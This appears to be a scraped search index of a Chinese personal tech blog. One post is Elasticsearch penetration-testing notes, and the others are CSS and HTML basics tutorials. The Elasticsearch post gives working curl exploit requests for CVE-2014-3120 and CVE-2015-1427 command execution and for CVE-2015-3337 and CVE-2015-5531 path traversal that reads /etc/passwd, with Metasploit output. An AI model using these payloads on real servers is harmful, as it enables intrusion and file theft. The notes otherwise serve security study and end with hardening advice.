#指定下载目录 URL1 URL2 ... URLn   ","description":"","id":43,"section":"blog","tags":null,"title":"curl-wget","uri":"http://crkmythical.github.io/blog/curl-wget/"},{"content":"编写进度\n   Elasticsearch是一个使用java开发的基于Lucene库的开源的高扩展的分布式全文搜索引擎。\n它可以近乎实时存储、检索数据,具有HTTP Web接口和无模式JSON文档。\n默认端口：\n 9200 http端口 9300 数据传输端口 组播端口(UDP) 54328  Elasticsearch API\nInfomation CURL\n1  curl http://10.200.88.6:9201 ｜ grep \u0026#34;You Know, for Search\u0026#34;   Nmap\n1 2 3 4 5 6 7 8 9  nmap -Pn -T4 -sV -p 9201 10.200.88.6 Nmap scan report for 10.200.88.6 Host is up (0.059s latency). PORT STATE SERVICE VERSION 9200/tcp open http Elasticsearch REST API 5.6.10 (name: 10.200.88.6; cluster: mscp-elasticsearch; Lucene 6.6.1) Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds   漏洞利用 cat API\n1  GET /_cat/nodes?h=ip,port,heapPercent,name   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  curl http://10.200.88.6:9201/_cat # 查看cat的功能  /_cat/nodes /_cat/tasks /_cat/indices /_cat/indices/{index} curl \u0026#34;http://10.200.88.6:9201/_cat/indices?v\u0026#34; health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open onc_v1_lb-2020-12-17 Ik3EFySWRyC2Nufv99iYpA 3 1 2304 0 713.1kb 356.7kb green open onc_v1_lb-2021-01-02 ewkYI6EuR--3PtesQsfZag 3 1 2304 0 724.1kb 362.1kb green open test gQHpUySfQaep7vfWs0zJzg 3 1 2 0 13.9kb 6.9kb curl http://10.200.88.6:9201/_nodes # 查看节点数据 {\u0026#34;_nodes\u0026#34;:{\u0026#34;total\u0026#34;:3,\u0026#34;successful\u0026#34;:3,\u0026#34;failed\u0026#34;:0},\u0026#34;cluster_name\u0026#34;:\u0026#34;mscp-elasticsearch\u0026#34;,\u0026#34;nodes\u0026#34;:{\u0026#34;-6isCA5RTaeItZlabhGf6A\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;transport_address\u0026#34;:\u0026#34;10.200.88.8:9301\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;ip\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;5.6.10\u0026#34;,\u0026#34;build_hash\u0026#34;:\u0026#34;b727a60\u0026#34;,\u0026#34;total_indexing_buffer\u0026#34;:830360780,\u0026#34;roles\u0026#34;:[\u0026#34;master\u0026#34;,\u0026#34;data\u0026#34;,\u0026#34;ingest\u0026#34;],\u0026#34;attributes\u0026#34;:{\u0026#34;ml.max_open_jobs\u0026#34;:\u0026#34;10\u0026#34;,\u0026#34;ml.enabled\u0026#34;:\u0026#34;true\u0026#34;},\u0026#34;settings\u0026#34;:{\u0026#34;cluster\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;mscp-elasticsearch\u0026#34;}{\u0026#34;type\u0026#34;:\u0026#34;set\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;set_security_user\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;sort\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;split\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;trim\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;uppercase\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;user_agent\u0026#34;}]}   EXP 创建一条测试数据 该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据\n1 2 3  curl -X POST \u0026#34;http://10.200.88.6:9201/website/blog\u0026#34; -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;test\u0026#34;}\u0026#39; {\u0026#34;_index\u0026#34;:\u0026#34;website\u0026#34;,\u0026#34;_type\u0026#34;:\u0026#34;blog\u0026#34;,\u0026#34;_id\u0026#34;:\u0026#34;AXbXVwBUIRRtVWWNffFo\u0026#34;,\u0026#34;_version\u0026#34;:1,\u0026#34;result\u0026#34;:\u0026#34;created\u0026#34;,\u0026#34;_shards\u0026#34;:{\u0026#34;total\u0026#34;:2,\u0026#34;successful\u0026#34;:2,\u0026#34;failed\u0026#34;:0},\u0026#34;created\u0026#34;:true}   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{\u0026#34;size\u0026#34;:1, \u0026#34;script_fields\u0026#34;: {\u0026#34;lupin\u0026#34;:{\u0026#34;script\u0026#34;: \u0026#34;1+665\u0026#34;}}}\u0026#39; -v { \u0026#34;took\u0026#34; : 5, \u0026#34;timed_out\u0026#34; : false, \u0026#34;_shards\u0026#34; : { \u0026#34;total\u0026#34; : 102, \u0026#34;successful\u0026#34; : 102, \u0026#34;skipped\u0026#34; : 0, \u0026#34;failed\u0026#34; : 0 }, \u0026#34;hits\u0026#34; : { \u0026#34;total\u0026#34; : 68637, \u0026#34;max_score\u0026#34; : 1.0, \u0026#34;hits\u0026#34; : [ { \u0026#34;_index\u0026#34; : \u0026#34;onc_v1_lb-2020-12-08\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;vperf\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;AXY97qwJP4DeVVFFFPWX\u0026#34;, \u0026#34;_score\u0026#34; : 1.0, \u0026#34;fields\u0026#34; : { \u0026#34;lupin\u0026#34; : [ 666 ] } } ] } }   ElasticSearch 命令执行漏洞CVE-2014-3120 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{ \u0026#34;size\u0026#34;: 1, \u0026#34;query\u0026#34;: { \u0026#34;filtered\u0026#34;: { \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: { } } } }, \u0026#34;script_fields\u0026#34;: { \u0026#34;command\u0026#34;: { \u0026#34;script\u0026#34;: \u0026#34;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\u0026#34;id\\\u0026#34;).getInputStream()).useDelimiter(\\\u0026#34;\\\\\\\\A\\\u0026#34;).next();\u0026#34; } } }\u0026#39;   ElasticSearch Groovy 沙盒绕过 \u0026amp;\u0026amp; 代码执行漏洞CVE-2015-1427 1 2 3 4 5 6 7 8 9  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{ \u0026#34;size\u0026#34;:1, \u0026#34;script_fields\u0026#34;:{ \u0026#34;lupin\u0026#34;:{ \u0026#34;lang\u0026#34;:\u0026#34;groovy\u0026#34;, \u0026#34;script\u0026#34;:\u0026#34;java.lang.Math.class.forName(\\\u0026#34;java.lang.Runtime\\\u0026#34;).getRuntime().exec(\\\u0026#34;id\\\u0026#34;).getText()\u0026#34; } } }\u0026#39;   ElasticSearch 目录穿越漏洞CVE-2015-3337 1  curl -X GET \u0026#34;http://10.200.88.6:9201/_plugin/head/../../../../../../../../../etc/passwd\u0026#34; -v   ElasticSearch 目录穿越漏洞CVE-2015-5531 MSF模块利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  Module options (auxiliary/scanner/http/elasticsearch_traversal): Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 7 yes Traversal depth FILEPATH /etc/passwd yes The path to the file to read Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.108.223 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 9200 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host 192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) \u0026gt; run [*] The target appears to be vulnerable. [+] File saved in: /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) \u0026gt; cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt [*] exec: cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin   curl利用  新建一个仓库  1 2 3 4 5 6 7  curl -X POST \u0026#34;http://192.168.79.28:9200/_snapshot/test\u0026#34; -d \u0026#39;{ \u0026#34;type\u0026#34;: \u0026#34;fs\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;location\u0026#34;: \u0026#34;/usr/share/elasticsearch/repo/test\u0026#34; } }\u0026#39; {\u0026#34;acknowledged\u0026#34;:true}   创建一个快照  1 2 3 4 5 6 7  curl -X POST \u0026#34;http://192.168.79.28:9200/_snapshot/test2\u0026#34; -d \u0026#39;{ \u0026#34;type\u0026#34;: \u0026#34;fs\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;location\u0026#34;: \u0026#34;/usr/share/elasticsearch/repo/test/snapshot-backdata\u0026#34; } }\u0026#39; {\u0026#34;acknowledged\u0026#34;:true}   目录穿越读取任意文件  POC\n\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  curl -X GET \u0026#34;http://192.168.79.28:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpa sswd\u0026#34; {\u0026#34;error\u0026#34;:\u0026#34;ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=919): [114, 111, 111, 1 16, 58, 120, 58, 48, 58, 48, 58, 114, 111, 111, 116, 58, 47, 114, 111, 111, 116, 58, 47, 98, 105, 110, 47, 98, 97, 115, 104, 10, 100, 97, 101, 109, 111, 110, 58, 120, 58, 49, 58, 49, 58, 100, 97, 101, 109, 111, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111 , 103, 105, 110, 10, 98, 105, 110, 58, 120, 58, 50, 58, 50, 58, 98, 105, 110, 58, 47, 98, 105, 110, 58, 47, 11 7, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 115, 58, 120, 58, 51, 58, 51, 58, 115, 121, 115, 58, 47, 100, 101, 118, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 110, 99, 58, 120, 58, 52, 58, 54, 53, 53, 51, 52, 58, 115, 121, 110, 9 9, 58, 47, 98, 105, 110, 58, 47, 98, 105, 110, 47, 115, 121, 110, 99, 10, 103, 97, 109, 101, 115, 58, 120, 58, 53, 58, 54, 48, 58, 103, 97, 109, 101, 115, 58, 47, 117, 115, 114, 47, 103, 97, 109, 101, 115, 58, 47, 117, 1 15, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 110, 58, 120, 58, 54, 58, 49, 50, 58, 109, 97, 110, 58, 47, 118, 97, 114, 47, 99, 97, 99, 104, 101, 47, 109, 97, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 112, 58, 120, 58, 55, 58, 55, 58, 108, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 108, 112, 100, 58, 47, 117, 115, 114, 47, 115 , 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 105, 108, 58, 120, 58, 56, 58, 56, 58, 109 , 97, 105, 108, 58, 47, 118, 97, 114, 47, 109, 97, 105, 108, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 101, 119, 115, 58, 120, 58, 57, 58, 57, 58, 110, 101, 119, 115, 5 8, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 110, 101, 119, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 117, 117, 99, 112, 58, 120, 58, 49, 48, 58, 49, 48, 58, 1 17, 117, 99, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 117, 117, 99, 112, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 112, 114, 111, 120, 121, 58, 120, 58, 4 9, 51, 58, 49, 51, 58, 112, 114, 111, 120, 121, 58, 47, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 119, 119, 119, 45, 100, 97, 116, 97, 58, 120, 58, 51, 51, 58, 51, 51, 58, 119, 119, 119, 45, 100, 97, 116, 97, 58, 47, 118, 97, 114, 47, 119, 119, 119, 58, 47, 117, 115, 1 14, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 98, 97, 99, 107, 117, 112, 58, 120, 58, 51, 52, 58, 51, 52, 58, 98, 97, 99, 107, 117, 112, 58, 47, 118, 97, 114, 47, 98, 97, 99, 107, 117, 112, 115, 5 8, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 105, 115, 116, 58, 120, 58, 51, 56, 58, 51, 56, 58, 77, 97, 105, 108, 105, 110, 103, 32, 76, 105, 115, 116, 32, 77, 97, 110, 97, 103, 101, 114, 58, 47, 118, 97, 114, 47, 108, 105, 115, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 105, 114, 99, 58, 120, 58, 51, 57, 58, 51, 57, 58, 105, 114, 99, 100, 58, 47, 118, 97, 114, 47, 114, 117, 110, 47, 105, 114, 99, 100, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 103, 110, 97, 116, 115, 58, 120, 58, 52, 49, 58, 52, 49, 58, 71, 110, 97, 116, 115, 32, 66, 117, 103, 45, 82, 101, 112, 111, 114, 116, 105, 110, 103, 32, 83, 121, 115, 116, 101, 109, 32, 40, 97, 100, 109, 105, 110, 41, 58, 47, 118, 97, 114, 47, 108, 105, 98, 47, 103, 110, 97, 116, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 111, 98, 111, 100, 121, 58, 120, 58, 54, 53, 53, 51, 52, 58, 54, 53, 53, 51, 52, 58, 110, 111, 98, 111, 100, 121, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 95, 97, 112, 116, 58, 120, 58, 49, 48, 48, 58, 54, 53, 53, 51, 52, 58, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 98, 105, 110, 47, 102, 97, 108, 115, 101, 10]]\u0026#34;,\u0026#34;status\u0026#34;:400}   对十进制整数进行解码即可\n解码平台\nSolution  限制IP访问，绑定固定IP 在config/elasticsearch.yml中为9200端口设置认证：  1 2 3 4  http.basic.enabled true #开关，开启会接管全部HTTP连接 http.basic.user \u0026#34;admin\u0026#34; #账号 http.basic.password \u0026#34;admin_pw\u0026#34; #密码 http.basic.ipwhitelist [\u0026#34;localhost\u0026#34;, \u0026#34;127.0.0.1\u0026#34;]   ","description":"","id":44,"section":"blog","tags":null,"title":"Elasticsearch","uri":"http://crkmythical.github.io/blog/elasticsearch/"},{"content":"编写进度\n [x]  CSS(Cascading Style Sheet) 层叠样式表,是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言。\nW3School TIY Editor\nCSS引入方式\n1  \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;path/to/xx.css\u0026#34; /\u0026gt;   CSS规则：\n1 2 3 4 5  selector { style_name1: value1; style_name2: value2; ... }   CSS基本样式 四种基础选择器\n 派生选择器 通过依据元素在其位置的上下文关系来定义样式，可以使标记更加简洁  1 2 3 4  li strong { font-style: italic; font-weight: normal; }    id选择器 id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。以 “#” 来定义  1 2 3  #pid { color: #00755f; }    类选择器 类可以为特定class属性的HTML元素指定特定的样式，以一个点号(.)定义  1 2 3  .divclass { color: red; }    属性选择器 对带有指定属性的 HTML 元素设置样式。  1 2 3 4  [title] { color:red; }   背景 重要属性\n   属性 描述     background-attachment 背景图像是否固定或者随着页面的其余部分滚动   background-color 设置元素的背景颜色   background-image 把图片设置为背景   background-position 设置背景图片的起始位置   background-repeat 设置背景图片是否及如何重复    CSS3 背景\n   属性 描述     background-size 规定背景图片的尺寸   background-origin 规定背景图片的定位区域   background-clip 规定背景的绘制区域    1 2 3 4 5  /* 把python.png设置为背景图片，但是不平铺 */ body { background-image: url(\u0026#34;python.png\u0026#34;); background-repeat: no-repeat; }   文本 重要属性\n   属性 描述     color 文本颜色   direction 文本方向   line-height 行高   letter-spacing 字符间距   text-align 对齐元素中的文本   text-decoration 向文本添加修饰   text-indent 缩进元素中文本的首行   text-transform 元素中的字母   unicode-bidi 设置文本方向   white-space 元素中空白的处理方式   word-spacing 字间距    链接 CSS链接的四种状态\n a:link –普通的、未被访问的链接 a:visited –用户已访问的链接 a:hover –鼠标指针位于链接的上方 a:active –链接被点击的时刻  注意事项\n a:hover必须位于a:link和a:visited之后 a:active必须位于a:hover之后  1 2 3 4  a:link {color:#FF0000;}\t/* 未被访问的链接 */ a:visited {color:#00FF00;}\t/* 已被访问的链接 */ a:hover {color:#FF00FF;}\t/* 鼠标指针移动到链接上 */ a:active {color:#0000FF;}\t/* 正在被点击的链接 */   列表    属性 描述     list-style 简写属性。用于把所有用于列表的属性设置于一个声明中。   list-style-image 将图象设置为列表项标志。   list-style-position 设置列表中列表项标志的位置。   list-style-type 设置列表项标志的类型。   marker-offset     1 2 3  ul li { list-style-image : url(xxx.gif) }   表格    属性 描述     border-collapse 设置是否把表格边框合并为单一的边框。   border-spacing 设置分隔单元格边框的距离。   caption-side 设置表格标题的位置。   empty-cells 设置是否显示表格中的空单元格。   table-layout 设置显示单元、行和列的算法。    1 2 3 4  table, th, td { border: 1px solid blue; }   轮廓    属性 描述 CSS     outline 在一个声明中设置所有的轮廓属性。 2   outline-color 设置轮廓的颜色。 2   outline-style 设置轮廓的样式。 2   outline-width 设置轮廓的宽度。 2    1 2 3 4 5  #p1 { outline-color: #ff704d; outline-style: groove; outline-width: 10px; }   CSS盒子模型 内边距padding 内边距\n padding属性定义元素边框与元素内容之间的空白区域 padding属性接受长度值或百分比值，但不允许使用负值 按照上、右、下、左的顺序分别设置各边的内边距  内边距的四个属性\n padding-top padding-right padding-bottom padding-left  1 2 3 4 5 6 7  h1 { padding-top: 10px; padding-right: 0.25em; padding-bottom: 2ex; padding-left: 20%; }   边框border 边框\n 元素的边框(border)是围绕元素内容和内边距的一条或多条线 设置border属性可以规定元素边框的样式、宽度和颜色  边框样式\n border-style设置样式  边框宽度\n border-width需要设置边框的宽度 border-top-width border-right-width border-bottom-width border-left-width  边框颜色\n border-color需要设置边框的颜色 border-top-color border-right-color border-bottom-color border-left-color  1 2 3 4 5 6 7 8 9 10 11  td { border-style: solid; border-width: 15px 5px 15px 5px; } border-style: dashed; border-top-width: 15px; border-right-width: 5px; border-bottom-width: 15px; border-left-width: 5px; border-color: blue rgb(25%, 35%, 45%) #909090 red;   外边距margin 外边距\n 外边距就是围绕在内容框的区域，默认为透明的区域 同样，外边距也接受任何长度的单位、百分数，与内边距很相似 margin的默认值是0，但是一般浏览器都会预定提供样式 对称复制  外边距的四个属性\n margin-top margin-right margin-bottom margin-left  1 2 3 4 5 6 7  h2 { margin-top: 20px; margin-right: 30px; margin-bottom: 30px; margin-left: 20px; }   外边距合并 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。\n当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。请看下图：\n当一个元素包含在另一个元素中时（假设没有内边距或边框把外边距分隔开），它们的上和/或下外边距也会发生合并。请看下图：\nCSS定位 定位的基本思想很简单，它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。\n定位机制 CSS 有三种基本的定位机制\n 普通流 元素按照其在HTML中的位置顺序决定排布的过程。 浮动 浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。 绝对定位: 绝对定位使元素的位置与文档流无关，因此不占据空间。这一点与相对定位不同，相对定位实际上被看作普通流定位模型的一部分，因为元素的位置相对于它在普通流中的位置。  定位属性\n position，将元素放在一个静态的、相对的、绝对的或固定的位置 通过对 top,left,right,bottom 这四个属性的赋值让元素向对应的方向偏移 overflow设置元素溢出其区域发生的事情 clip 设置元素的显示形状，多用于图片 vertical-align设置元素的垂直对其方式 z-index设置元素的堆叠顺序  相对定位 设置为相对定位的元素框会偏移某个距离。元素仍然保持其未定位前的形状，它原本所占的空间仍保留。\n1 2 3 4 5  #box_relative { position: relative; left: 30px; top: 20px; }   绝对定位 设置为绝对定位的元素框从文档流完全删除，并相对于其包含块定位，包含块可能是文档中的另一个元素或者是初始包含块。\n元素原先在正常文档流中所占的空间会关闭，就好像该元素原来不存在一样。 元素定位后生成一个块级框，而不论原来它在正常流中生成何种类型的框。\n1 2 3 4 5  #box_relative { position: absolute; left: 30px; top: 20px; }   浮动 浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。\n由于浮动框不在文档的普通流中，所以文档的普通流中的块框表现得就像浮动框不存在一样。\nfloat属性可以赋值如下\n left：元素向左浮动 right：元素向右浮动 none：不浮动 inherit：从父级继承浮动的属性 clear：主要用于去掉向各方向的浮  ","description":"","id":45,"section":"blog","tags":null,"title":"css_basic","uri":"http://crkmythical.github.io/blog/css-basic/"},{"content":"编写进度\n   HTML(Hyper Text Markup Language) 是一种用来制作超文本文件的简单标记语言，用HTML编写的超文本文件成为html文件，它能独立于各种操作系统平台。\nW3School TIY Editor\n1 2 3 4 5 6 7 8  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!--头部信息--\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--文件主题---\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   层标签 1 2 3  \u0026lt;div id=\u0026#34;\u0026#34; align=\u0026#34;\u0026#34; style=\u0026#34;\u0026#34; class=\u0026#34;\u0026#34;\u0026gt; ... \u0026lt;/div\u0026gt;   文本样式 标题与段落 1 2 3 4 5  \u0026lt;h1\u0026gt;Typography\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;History\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Thomas identified the victim only as a 32-year-old woman.\u0026lt;/p\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;!-- 换行---\u0026gt; \u0026lt;hr /\u0026gt;\u0026lt;!-- 水平分割线\u0026gt;   链接 超链接 href的写法\n1 2 3 4 5 6 7 8 9  \u0026lt;a href=\u0026#34;http://www.w3.org/index.html\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;//www.w3.org/index.html\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;mailto:askding@qq.com?Subject=我有疑问\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;ftp://ftp.pku.edu.cn\u0026#34;\u0026gt;跳转到FTP\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;telnet://10.1.1.1\u0026#34;\u0026gt;Telnet到10.1.1.1\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;a/b/c.html\u0026#34;\u0026gt;相对路径\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;../../c.html\u0026#34;\u0026gt;相对路径\u0026lt;/a\u0026gt;   页面内锚点\n1 2  \u0026lt;p id=\u0026#34;test\u0026#34;\u0026gt;test\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;#test\u0026#34;\u0026gt;回到test\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;   链接目标target的写法\n1 2  \u0026lt;a href=\u0026#34;http://www.w3.org\u0026#34; target=\u0026#34;_self\u0026#34;\u0026gt;W3C(当前窗口打开)\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;http://www.w3.org\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;W3C(新建窗口打开)\u0026lt;/a\u0026gt;   图片链接 1  \u0026lt;img src=\u0026#34;/path/to/img.jpg\u0026#34; alt=\u0026#34;替代文字\u0026#34; /\u0026gt;   多媒体 动态文字 1 2 3 4 5 6 7 8 9  \u0026lt;marquee direction=\u0026#34;left/right/up/down\u0026#34; behavior=\u0026#34;scroll/slide/alternate\u0026#34; loop=1 scrollamount=5 scrolldelay=1 bgcolor=“#FFFF55” width=300 height=500\u0026gt; 动态文字. \u0026lt;/marquee\u0026gt; direction: 滚动方向 behavior: 滚动方式 loop: 循环次数 scrollamount: 滚动速度 scrolldelay: 滚动延迟 bgcolor: 背景颜色 width、height:滚动面积   Audio标签 1  \u0026lt;audio src=\u0026#34;path/to/audio_file\u0026#34; autoplay=\u0026#34;\u0026#34; controls=\u0026#34;\u0026#34; loop=1\u0026#34; \u0026gt;您的浏览器不支持audio标记\u0026lt;/audio\u0026gt;   Video标签 1 2  \u0026lt;video src=\u0026#34;path/to/video_file\u0026#34; autoplay=\u0026#34;\u0026#34; width=10 height=10 loop=1 \u0026gt;您的浏览器不支持video标记\u0026lt;/video\u0026gt;   字幕标签 1  \u0026lt;track src=\u0026#34;vat/sintel-en.vtt\u0026#34; srclang=\u0026#34;en\u0026#34;. kind=\u0026#34;captions\u0026#34; label=\u0026#34;English captions\u0026#34; /\u0026gt;   多媒体文件 1 2  \u0026lt;embed src=\u0026#34;/path/to/file\u0026#34; autostart=True/False loop=3 hidden=True/False width=300 height=400\u0026gt;\u0026lt;/embed\u0026gt;   背景音乐 1  \u0026lt;bgsound src=\u0026#34;/path/to/music.mp3\u0026#34; loop= 1\u0026gt;   列表 定义列表 1 2 3 4  \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;名词1\u0026lt;dd\u0026gt;解释名词1 \u0026lt;dt\u0026gt;名词2\u0026lt;dd\u0026gt;解释名词2 \u0026lt;/dl\u0026gt;   无序列表 1 2 3 4 5 6  \u0026lt;ul type=\u0026#34;disc/circle/square\u0026#34;\u0026gt; \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;/ul\u0026gt;   有序列表 1 2 3 4 5 6 7  \u0026lt;ol type=1/a/A/i/I start=1 \u0026gt; \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;/ol\u0026gt;   菜单列表 1 2 3 4 5 6  \u0026lt;menu\u0026gt; \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;/menu\u0026gt;   目录列表 1 2 3 4 5 6 7  \u0026lt;dir\u0026gt; \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;/dir\u0026gt;   表格 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;table width=300 height=300 align=\u0026#34;left/center/right\u0026#34; border=1 bordercolor=\u0026#34;#FFFF55\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;表格标题\u0026lt;/caption\u0026gt; \u0026lt;thead bgcolor align \u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第一行---\u0026gt; \u0026lt;th\u0026gt;表头1\u0026lt;/th\u0026gt; \u0026lt;!--第一列---\u0026gt; \u0026lt;th\u0026gt;表头2\u0026lt;/th\u0026gt; \u0026lt;!--第二列---\u0026gt; \u0026lt;th\u0026gt;表头3\u0026lt;/th\u0026gt; \u0026lt;!--第三列---\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tbody bicolor=\u0026#34;\u0026#34; aligin=\u0026#34;\u0026#34;\u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第一行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第一列---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第二列---\u0026gt; 